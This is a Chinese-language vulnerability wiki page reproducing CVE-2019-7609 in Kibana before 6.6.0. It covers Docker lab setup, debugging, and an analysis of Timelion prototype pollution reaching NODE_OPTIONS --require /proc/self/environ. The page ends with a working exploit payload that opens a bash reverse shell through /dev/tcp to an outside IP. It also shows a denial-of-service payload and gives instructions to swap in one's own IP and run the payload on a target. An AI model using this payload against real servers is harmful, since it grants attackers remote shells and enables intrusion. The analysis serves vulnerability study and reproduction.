<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Kibana/%EF%BC%88CVE-2019-7609%EF%BC%89Kibana%20_%206.6.0%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2019-7609）kibana \&lt; 6.6.0 未授权远程代码命令执行 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2019-7609\uff09kibana \\\u0026lt; 6.6.0 \u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u547d\u4ee4\u6267\u884c", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../CVE-2018-17246/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../CVE-2018-17246/" class="btn btn-xs btn-link">
        Kibana Local File Inclusion (CVE-2018-17246)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2018-17246%EF%BC%89Kibana%20Local%20File%20Inclusion/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2018-17246%EF%BC%89Kibana%20Local%20File%20Inclusion/" class="btn btn-xs btn-link">
        （CVE-2018-17246）Kibana Local File Inclusion
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2019-7609kibana-660">（CVE-2019-7609）kibana \&lt; 6.6.0 未授权远程代码命令执行<a class="headerlink" href="#cve-2019-7609kibana-660" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Kibana 是一款开源的数据分析和可视化平台，它是Elastic
Stack成员之一，设计用于和Elasticsearch协作。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>kibana \&lt; 6.6.0</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h4 id="_4">环境搭建<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="x">docker pull docker.elastic.co/kibana/kibana:6.5.4 </span>
<span class="x">docker network create elastic </span>
<span class="x">docker run --network=elastic --name=elasticsearch docker.elastic.co/elasticsearch/elasticsearch:6.5.4</span>
<span class="x">docker run -d --name kibana --net elastic -p 5601:5601 docker.elastic.co/kibana/kibana:6.5.4 </span>
<span class="x">docker inspect -f &#39;</span><span class="cp">{{</span><span class="nv">range</span> <span class="nv">.NetworkSettings.Networks</span><span class="cp">}}{{</span><span class="nv">.IPAddress</span><span class="cp">}}{{</span><span class="nv">end</span><span class="cp">}}</span><span class="x">&#39; kibana</span>
</code></pre></div>

<p>这样启动的kibana没法调试，可以自己改改镜像，在node启动命令里加个inspect参数：</p>
<div class="codehilite"><pre><span></span><code>docker ps -a --no-trunc  # 找到启动脚本

在node启动命令后加上--inspect=0.0.0.0:9229

docker commit kibana kibana-debug  # 保存修改后的镜像
docker rm -f kibana
docker run --name kibana --net elastic -p 5601:5601 -p 9229:9229 kibana-debug  # 启动修改后的kibana容器
</code></pre></div>

<p>kibana控制台：<a href="http://127.0.0.1:5601/">http://127.0.0.1:5601/</a> inspect调试器：chrome://inspect/</p>
<h4 id="_5">漏洞分析<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
<p>原型链污染点：props()函数可以给对象设置属性</p>
<p><img alt="" src="./resource/(CVE-2019-7609)Kibana&lt;6.6.0未授权远程代码命令执行/media/rId27.png" /></p>
<p>有了污染点，就可以思考怎么利用了。</p>
<p>最简单的利用，设置一个cookie就可以导致拒绝服务：</p>
<div class="codehilite"><pre><span></span><code><span class="na">.es</span><span class="p">(*).</span><span class="no">props</span><span class="p">(</span><span class="no">label.__proto__.cookie</span><span class="err">=</span><span class="s">&quot;aaa&quot;</span><span class="p">)</span>
</code></pre></div>

<p><img alt="" src="./resource/(CVE-2019-7609)Kibana&lt;6.6.0未授权远程代码命令执行/media/rId28.png" /></p>
<p>要复原的话可以在inspect调试器里删掉原型对象的cookie属性：</p>
<p><img alt="" src="./resource/(CVE-2019-7609)Kibana&lt;6.6.0未授权远程代码命令执行/media/rId29.png" /></p>
<p>DOS很好实现，怎么搞成RCE呢？根据经验，容易想到一些常见情形，如：</p>
<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="ss">(</span><span class="nv">obj</span>.<span class="nv">jsCode</span><span class="ss">)</span><span class="w"> </span><span class="nv">eval</span><span class="ss">(</span><span class="nv">obj</span>.<span class="nv">jsCode</span><span class="ss">)</span><span class="w"> </span>这种白给的
<span class="nv">express</span><span class="w"> </span><span class="nv">ejs</span>模版引擎中的动态函数调用
</code></pre></div>

<p>作者并没有找到明显的代码执行点，但是在瞎点到canvas的时候，他发现控制台暴了很多错误（这是inpector的输出，也就是说如果启docker的时候加了-d的话，可能就错过这个RCE了...）。</p>
<p><img alt="" src="./resource/(CVE-2019-7609)Kibana&lt;6.6.0未授权远程代码命令执行/media/rId30.png" /></p>
<p>作者据此得出结论：kibana在创建新进程
创建进程可就是个敏感的行为了，能不能污染命令/参数呢？
来动态看下进程创建的过程，</p>
<p><img alt="" src="./resource/(CVE-2019-7609)Kibana&lt;6.6.0未授权远程代码命令执行/media/rId31.png" /></p>
<p>首先调用normalizeSpawnArguments.apply()处理参数，</p>
<p><img alt="" src="./resource/(CVE-2019-7609)Kibana&lt;6.6.0未授权远程代码命令执行/media/rId32.png" /></p>
<p>跟进，</p>
<p><img alt="" src="./resource/(CVE-2019-7609)Kibana&lt;6.6.0未授权远程代码命令执行/media/rId33.png" /></p>
<p>这里实际是在处理child_process.spawn(command[, args][,
options])的第三个参数options。</p>
<p><img alt="" src="./resource/(CVE-2019-7609)Kibana&lt;6.6.0未授权远程代码命令执行/media/rId34.png" /></p>
<p>这里面的有些参数是undefined的，只有声明了才会处理，也即是我们可以污染的。
作者利用的就是这个env参数，它以键值对的形式向子进程传递环境变量（我尝试了一些其它参数，没发现可利用的）。</p>
<p>能控制进程的环境变量了，有什么用呢？我们不知道子进程会对环境变量做些什么操作啊，这是容易被忽视的一个重点。
回想下控制台报的错：\"Starting inspector on 0.0.0.0:9229 failed: address
already in use\"。
这句话透露出的是：此时正在创建一个node命令进程，并且使用了--inpect:0.0.0.0:9229参数。
这下目标就清晰了，我们能控制的node的环境变量。</p>
<p>在node中，有一个NODE_OPTIONS变量，</p>
<p><img alt="" src="./resource/(CVE-2019-7609)Kibana&lt;6.6.0未授权远程代码命令执行/media/rId35.png" /></p>
<p>通过这个变量，可以覆盖node进程的参数。
也就是说，现在我们能控制node进程的参数了。这就很有用了，比如--eval参数是可以直接执行代码的。</p>
<p><img alt="" src="./resource/(CVE-2019-7609)Kibana&lt;6.6.0未授权远程代码命令执行/media/rId36.png" /></p>
<p>但是，NODE_OPTIONS似乎考虑到了这种潜在的安全问题，它只能使用部分参数，向--eval这种是用不了的。</p>
<p>不过作者找到了另一个参数--require，</p>
<p><img alt="" src="./resource/(CVE-2019-7609)Kibana&lt;6.6.0未授权远程代码命令执行/media/rId37.png" /></p>
<p>这个有点像php里的auto_prepend_file，预加载一个文件。</p>
<p><img alt="" src="./resource/(CVE-2019-7609)Kibana&lt;6.6.0未授权远程代码命令执行/media/rId38.png" /></p>
<p>现在我们可以看成有一个文件包含的洞了，怎么RCE呢？
通常，我们都会上传一个文件再包含，或者去包含web服务器日志/SSH日志。
作者这里利用的方法也十分巧妙，Linux下一切皆文件，我们已经能控制子进程的环境变量，也就是能控制/proc/self/environ这个文件，直接包含这个文件不就好了。</p>
<p><img alt="" src="./resource/(CVE-2019-7609)Kibana&lt;6.6.0未授权远程代码命令执行/media/rId39.png" /></p>
<p>最后payload如下：</p>
<blockquote>
<p>将POC里的反链IP地址换成自己的，然后在目标机器上的 <code>Timelion</code>
选项下将以下 <code>POC</code> 粘贴进去，然后点击 <code>Run</code> 运行：</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="na">.es</span><span class="p">(*).</span><span class="no">props</span><span class="p">(</span><span class="no">label.__proto__.env.AAAA</span><span class="err">=&#39;</span><span class="no">require</span><span class="p">(</span><span class="s">&quot;child_process&quot;</span><span class="p">).</span><span class="no">exec</span><span class="p">(</span><span class="s">&quot;bash -c \&#39;bash -i&gt;&amp; /dev/tcp/10.70.53.113/6666 0&gt;&amp;1\&#39;&quot;</span><span class="p">)</span><span class="c1">;//&#39;)</span>
<span class="na">.props</span><span class="p">(</span><span class="no">label.__proto__.env.NODE_OPTIONS</span><span class="err">=&#39;</span><span class="p">--</span><span class="no">require</span><span class="w"> </span><span class="err">/</span><span class="no">proc</span><span class="err">/</span><span class="no">self</span><span class="err">/</span><span class="no">environ</span><span class="err">&#39;</span><span class="p">)</span>
</code></pre></div>

<p>然后自己机器开启监听，再点击 Canvas</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../CVE-2018-17246/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../CVE-2018-17246/" class="btn btn-xs btn-link">
        Kibana Local File Inclusion (CVE-2018-17246)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2018-17246%EF%BC%89Kibana%20Local%20File%20Inclusion/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2018-17246%EF%BC%89Kibana%20Local%20File%20Inclusion/" class="btn btn-xs btn-link">
        （CVE-2018-17246）Kibana Local File Inclusion
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>